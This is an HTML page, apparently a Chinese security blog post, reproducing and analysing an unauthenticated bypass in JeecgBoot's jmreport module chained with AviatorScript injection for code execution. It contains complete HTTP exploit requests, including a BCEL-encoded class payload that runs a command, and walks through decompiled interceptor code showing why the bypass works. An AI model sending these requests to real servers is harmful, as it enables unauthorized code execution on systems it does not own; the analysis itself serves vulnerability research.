@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="漏洞描述积木报表（jmreport）被曝出存在一个未授权绕过漏洞。该漏洞允许攻击者在请求中包含特定参数时绕过授权机制，从而访问诸如 save、queryFieldBySql、show 等接口。尽管之前的远程代码执行（RCE）漏洞已被修复，但攻击者仍能通过 AviatorScript 表达式注入，继续实现 RCE 攻击。 目前，积木报表的最新版本为 1.7.9，但测试发现，该版本仍存在授权绕过的风险">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jeecgboot 权限绕过+AviatorScript代码执行漏洞">
+<meta property="og:url" content="http://example.com/2024/08/13/jeecgboot-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-AviatorScript%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="漏洞描述积木报表（jmreport）被曝出存在一个未授权绕过漏洞。该漏洞允许攻击者在请求中包含特定参数时绕过授权机制，从而访问诸如 save、queryFieldBySql、show 等接口。尽管之前的远程代码执行（RCE）漏洞已被修复，但攻击者仍能通过 AviatorScript 表达式注入，继续实现 RCE 攻击。 目前，积木报表的最新版本为 1.7.9，但测试发现，该版本仍存在授权绕过的风险">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240812175012233.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240812175206250.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813102413508.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813094324130.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813094726992.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813095513755.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813100632485.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813100847936.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813101023803.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813101037030.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813101102384.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813101302038.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813101556512.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813102009224.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813102152867.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813103342217.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813104350910.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813104805131.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/image-20240813104824692.png">
+<meta property="og:image" content="https://whoopsunix.com/assets/images/image-20240502111908506-74d459b0292af6e4b3216e841360b42f.png">
+<meta property="article:published_time" content="2024-08-13T03:09:50.000Z">
+<meta property="article:modified_time" content="2025-05-25T03:25:14.628Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/image-20240812175012233.png">
+
+<link rel="canonical" href="http://example.com/2024/08/13/jeecgboot-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-AviatorScript%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>jeecgboot 权限绕过+AviatorScript代码执行漏洞 | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/13/jeecgboot-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-AviatorScript%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          jeecgboot 权限绕过+AviatorScript代码执行漏洞
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-08-13 11:09:50" itemprop="dateCreated datePublished" datetime="2024-08-13T11:09:50+08:00">2024-08-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-25 11:25:14" itemprop="dateModified" datetime="2025-05-25T11:25:14+08:00">2025-05-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>积木报表（jmreport）被曝出存在一个未授权绕过漏洞。该漏洞允许攻击者在请求中包含特定参数时绕过授权机制，从而访问诸如 save、queryFieldBySql、show 等接口。尽管之前的远程代码执行（RCE）漏洞已被修复，但攻击者仍能通过 AviatorScript 表达式注入，继续实现 RCE 攻击。</p>
+<p>目前，积木报表的最新版本为 1.7.9，但测试发现，该版本仍存在授权绕过的风险。漏洞修复的版本暂未发布。</p>
+<span id="more"></span>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里使用的环境是<code>jeecg-boot 3.7.0</code>，积木报表版本为<code>1.7.9</code>。</p>
+<p>开启一个redis，开启mysql，导入jeecgboot-mysql-5.7.sql，数据库配置文件在src&#x2F;main&#x2F;resources&#x2F;application-dev.yml</p>
+<p>发送如下数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">POST /jeecg-boot/jmreport/save?previousPage=xxx&amp;jmLink=YWFhfHxiYmI=&amp;token=123 HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 2172</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;loopBlockList&quot;: [],</span><br><span class="line">    &quot;area&quot;: false,</span><br><span class="line">    &quot;printElWidth&quot;: 718,</span><br><span class="line">    &quot;excel_config_id&quot;: &quot;980882669965455368&quot;,</span><br><span class="line">    &quot;printElHeight&quot;: 1047,</span><br><span class="line">    &quot;rows&quot;: &#123;</span><br><span class="line">        &quot;4&quot;: &#123;</span><br><span class="line">            &quot;cells&quot;: &#123;</span><br><span class="line">                &quot;4&quot;: &#123;</span><br><span class="line">                    &quot;text&quot;: &quot;=((c=Class.forName(\&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A\&quot;,true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\&quot;calc\&quot;) );)&quot;,</span><br><span class="line">                    &quot;style&quot;: 0</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;height&quot;: 25</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;len&quot;: 96,</span><br><span class="line">        &quot;-1&quot;: &#123;</span><br><span class="line">            &quot;cells&quot;: &#123;</span><br><span class="line">                &quot;-1&quot;: &#123;</span><br><span class="line">                    &quot;text&quot;: &quot;$&#123;gongsi.id&#125;&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;isDrag&quot;: true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;dbexps&quot;: [],</span><br><span class="line">    &quot;toolPrintSizeObj&quot;: &#123;</span><br><span class="line">        &quot;printType&quot;: &quot;A4&quot;,</span><br><span class="line">        &quot;widthPx&quot;: 718,</span><br><span class="line">        &quot;heightPx&quot;: 1047</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;dicts&quot;: [],</span><br><span class="line">    &quot;freeze&quot;: &quot;A1&quot;,</span><br><span class="line">    &quot;dataRectWidth&quot;: 701,</span><br><span class="line">    &quot;background&quot;: false,</span><br><span class="line">    &quot;name&quot;: &quot;sheet1&quot;,</span><br><span class="line">    &quot;autofilter&quot;: &#123;&#125;,</span><br><span class="line">    &quot;styles&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;align&quot;: &quot;center&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;validations&quot;: [],</span><br><span class="line">    &quot;cols&quot;: &#123;</span><br><span class="line">        &quot;4&quot;: &#123;</span><br><span class="line">            &quot;width&quot;: 95</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;len&quot;: 50</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;merges&quot;: [</span><br><span class="line">        &quot;E4:F4&quot;,</span><br><span class="line">        &quot;B4:B5&quot;,</span><br><span class="line">        &quot;C4:C5&quot;,</span><br><span class="line">        &quot;D4:D5&quot;,</span><br><span class="line">        &quot;G4:G5&quot;,</span><br><span class="line">        &quot;H4:H5&quot;,</span><br><span class="line">        &quot;I4:I5&quot;,</span><br><span class="line">        &quot;D1:G1&quot;,</span><br><span class="line">        &quot;H3:I3&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后发送如下数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /jeecg-boot/jmreport/show?previousPage=xxx&amp;jmLink=YWFhfHxiYmI=&amp;token=123 HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 34</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"> &quot;id&quot;:&quot;980882669965455368&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/image-20240812175012233.png" alt="image-20240812175012233"></p>
+<p>验证的话直接用sql语句验证就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /jeecg-boot/jmreport/queryFieldBySql?previousPage=xxx&amp;jmLink=YWFhfHxiYmI=&amp;token=123 HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"> &quot;sql&quot;:&quot;select &#x27;ycxhhh&#x27;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ilikeoyt.github.io/image/image-20240812175206250.png" alt="image-20240812175206250"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h4 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h4><p>之前积木报表也有一个漏洞，是在jmreport&#x2F;queryFieldBySql路由下的一个未授权sql查询，并且传入的sql语句还会被freemarker模板解析，造成rce。后续修复是对该路由做出了权限限制。</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813102413508.png" alt="image-20240813102413508"></p>
+<p>目前这个漏洞利用的第一步就是一个权限的绕过，观察payload，我们首先想到是拦截器的问题，搜索一下addInterceptors方法，跟进到org.jeecg.modules.jmreport.config.init.JimuReportConfiguration</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813094324130.png" alt="image-20240813094324130"></p>
+<p>发现对相应路由进行了拦截器的添加，看一下&#x2F;jmreport&#x2F;**路由具体的拦截器实现</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813094726992.png" alt="image-20240813094726992"></p>
+<p>跟进JimuReportTokenInterceptor</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;</span><br><span class="line">        if (!(handler instanceof HandlerMethod)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            String var4 = d.i(request.getRequestURI().substring(request.getContextPath().length()));</span><br><span class="line">            log.debug(&quot;JimuReportInterceptor check requestPath = &quot; + var4);</span><br><span class="line">            int var5 = 500;</span><br><span class="line">            if (n.a(var4)) &#123;</span><br><span class="line">                log.error(&quot;请注意，请求地址有xss攻击风险！&quot; + var4);</span><br><span class="line">                this.backError(response, &quot;请求地址有xss攻击风险!&quot;, var5);</span><br><span class="line">                return false;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                String var6 = this.jmBaseConfig.getCustomPrePath();</span><br><span class="line">                log.debug(&quot;customPrePath: &#123;&#125;&quot;, var6);</span><br><span class="line">                if (j.d(var6) &amp;&amp; !var6.startsWith(&quot;/&quot;)) &#123;</span><br><span class="line">                    var6 = &quot;/&quot; + var6;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                request.setAttribute(&quot;customPrePath&quot;, var6);</span><br><span class="line">                HandlerMethod var7 = (HandlerMethod)handler;</span><br><span class="line">                Method var8 = var7.getMethod();</span><br><span class="line">                if (var4.contains(&quot;/jmreport/shareView/&quot;)) &#123;</span><br><span class="line">                    return true;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    JimuNoLoginRequired var9 = (JimuNoLoginRequired)var8.getAnnotation(JimuNoLoginRequired.class);</span><br><span class="line">                    if (j.d(var9)) &#123;</span><br><span class="line">                        return true;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        boolean var10 = false;</span><br><span class="line"></span><br><span class="line">                        try &#123;</span><br><span class="line">                            var10 = this.verifyToken(request);</span><br><span class="line">                        &#125; catch (Exception var14) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        if (!var10) &#123;</span><br><span class="line">                            if (this.jimuReportShareService.isSharingEffective(var4, request)) &#123;</span><br><span class="line">                                return true;</span><br><span class="line">                            &#125; else &#123;</span><br><span class="line">                                String var16 = request.getParameter(&quot;previousPage&quot;);</span><br><span class="line">                                if (j.d(var16)) &#123;</span><br><span class="line">                                    if (this.jimuReportShareService.isShareingToken(var4, request)) &#123;</span><br><span class="line">                                        return true;</span><br><span class="line">                                    &#125; else &#123;</span><br><span class="line">                                        log.error(&quot;分享链接失效或分享token不匹配(&quot; + request.getMethod() + &quot;)：&quot; + var4);</span><br><span class="line">                                        this.backError(response, &quot;分享链接失效或分享token不匹配，禁止钻取!&quot;, var5);</span><br><span class="line">                                        return false;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125; else &#123;</span><br><span class="line">                                    log.error(&quot;Token校验失败！请求无权限(&quot; + request.getMethod() + &quot;)：&quot; + var4);</span><br><span class="line">                                    this.backError(response, &quot;Token校验失败，无权限访问！&quot;, var5);</span><br><span class="line">                                    return false;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            b var15 = (b)var8.getAnnotation(b.class);</span><br><span class="line">                            if (var15 != null) &#123;</span><br><span class="line">                                String[] var11 = var15.a();</span><br><span class="line">                                String[] var12 = this.jimuTokenClient.getRoles(request);</span><br><span class="line">                                if (var12 == null || var12.length == 0) &#123;</span><br><span class="line">                                    log.error(&quot;此接口需要角色权限，请联系管理员！请求无权限(&quot; + request.getMethod() + &quot;)：&quot; + var4);</span><br><span class="line">                                    if (&quot;/jmreport/loadTableData&quot;.equals(var4)) &#123;</span><br><span class="line">                                        var5 = GEN_TEST_DATA_CODE;</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                    this.backError(response, NO_PERMISSION_PROMPT_MSG, var5);</span><br><span class="line">                                    return false;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                boolean var13 = Arrays.stream(var12).anyMatch((code) -&gt; &#123;</span><br><span class="line">                                    return j.a(code, var11);</span><br><span class="line">                                &#125;);</span><br><span class="line">                                if (!var13) &#123;</span><br><span class="line">                                    log.error(&quot;此接口需要角色权限，请联系管理员！请求无权限(&quot; + request.getMethod() + &quot;)：&quot; + var4);</span><br><span class="line">                                    if (&quot;/jmreport/loadTableData&quot;.equals(var4)) &#123;</span><br><span class="line">                                        var5 = GEN_TEST_DATA_CODE;</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                    this.backError(response, NO_PERMISSION_PROMPT_MSG, var5);</span><br><span class="line">                                    return false;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            return true;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行了一个xss的检测，并且对&#x2F;jmreport&#x2F;shareView&#x2F;直接放行，然后有一个verifyToken方法的调用，跟进下去可以发现是jwt的验证</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813095513755.png" alt="image-20240813095513755"></p>
+<p>随后来到isSharingEffective方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813100632485.png" alt="image-20240813100632485"></p>
+<p>里面配置了一些路由白名单，我们的jmreport&#x2F;queryFieldBySql路由不在白名单，直接返回false，接着来到else模块</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813100847936.png" alt="image-20240813100847936"></p>
+<p>获取previousPage参数，跟进j.d方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813101023803.png" alt="image-20240813101023803"></p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813101037030.png" alt="image-20240813101037030"></p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813101102384.png" alt="image-20240813101102384"></p>
+<p>综合这三块代码，d方法最后返回true，步入isShareingToken方法</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813101302038.png" alt="image-20240813101302038"></p>
+<p>首先看请求头中是否有JmReport-Share-Token，如果没有的话就从参数shareToken中获取，随后获取jmLink参数，调用一个j.d(var5)方法，和刚刚一样，依旧是返回true，进入try模块</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813101556512.png" alt="image-20240813101556512"></p>
+<p>首先对jmLink参数进行base64解码，然后将解码后的字符串进行分割，分割符为<code>||</code>，如果分割后生成的数组不为空，并且长度为2的话，那么就将其分别赋值给var3和var4</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813102009224.png" alt="image-20240813102009224"></p>
+<p>这个if条件判断是否为空，返回false，步入else</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813102152867.png" alt="image-20240813102152867"></p>
+<p>只要路由不是&#x2F;jmreport&#x2F;view，那么就会返回true，成功绕过拦截器</p>
+<p>但由于高版本的积木报表采用了高于漏洞版本的freemarker依赖，所以这里依旧没法靠模板注入进行rce</p>
+<h4 id="AviatorScript-RCE"><a href="#AviatorScript-RCE" class="headerlink" title="AviatorScript RCE"></a>AviatorScript RCE</h4><p>查看save路由</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813103342217.png" alt="image-20240813103342217"></p>
+<p>将传入的报表数据传入saveReport方法，保存到数据库</p>
+<p>show路由根据id提取相应的数据</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813104350910.png" alt="image-20240813104350910"></p>
+<p>经过一系列调用对text参数进行compile方法的调用</p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813104805131.png" alt="image-20240813104805131"></p>
+<p><img src="https://ilikeoyt.github.io/image/image-20240813104824692.png" alt="image-20240813104824692"></p>
